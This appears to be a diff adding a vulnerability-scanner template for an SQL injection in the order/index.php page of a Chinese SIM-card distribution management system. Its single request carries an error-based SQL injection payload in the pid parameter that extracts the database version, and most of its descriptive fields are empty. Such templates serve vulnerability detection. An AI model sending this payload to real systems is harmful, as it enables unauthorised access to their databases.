@@ -1,0 +1,23 @@
+id:
+
+info:
+  name: 号卡极团分销管理系统index.php SQL注入
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /order/index.php?pid=1%27%20AND%20(extractvalue(1,concat(0x7e,(select%20version()),0x7e)));--%20htjf
+  headers:
+  data:
+response1:
+  headers:
+  body: log
+  code:
+requests2:
+response2:
+
+
+
+
